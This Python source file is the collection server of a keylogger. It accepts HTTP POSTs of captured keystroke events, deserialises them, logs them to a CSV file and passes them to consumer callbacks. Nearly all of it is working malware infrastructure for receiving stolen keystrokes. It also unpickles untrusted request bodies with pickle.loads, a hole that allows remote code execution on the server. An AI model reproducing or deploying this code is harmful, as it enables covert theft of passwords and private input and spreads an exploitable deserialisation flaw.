import inspect
from http.server import BaseHTTPRequestHandler, HTTPServer, HTTPStatus
from inspect import isfunction
from logging import INFO, StreamHandler, getLogger
from pathlib import Path
from pickle import loads
from typing import Optional

from .events import Event


class KeyloggerHTTPRequestHandler(BaseHTTPRequestHandler):
    __consumers = []
    save_file = None

    def send_response(self, code, message=None):
        """Overrides super class method to get rid of the call to `log_request`.
        """
        self.send_response_only(code, message)
        self.send_header('Server', self.version_string())
        self.send_header('Date', self.date_time_string())

    def do_POST(self):
        data = self.rfile.read(int(self.headers.get('Content-Length')))

        if self.headers.get('data-format') == 'raw':
            event = Event.from_raw(data)
        else:
            event = loads(data)

        if self.save_file:
            self.save_file.write(f'{event.datetime},{event.type_},{event.code},{event.value}\n')

        for consumer in self.__class__.__consumers:
            consumer(event)

        self.send_response(HTTPStatus.OK)
        self.end_headers()

    @classmethod
    def add_consumer(cls, consumer):
        cls.__consumers.append(consumer)


def server_loop(address: str, port: int, file_: Optional[Path]):
    if file_:
        print(f"Captured keys will be saved to '{file_}'")
        f = open(file_, 'w')
        f.write('datetime,type,code,value\n')
        KeyloggerHTTPRequestHandler.save_file = f

    server = HTTPServer((address, port), KeyloggerHTTPRequestHandler)
    print(f'Server listening on {address}:{port}')

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('Server shuting down!')
        if file_:
            f.close()
        server.shutdown()
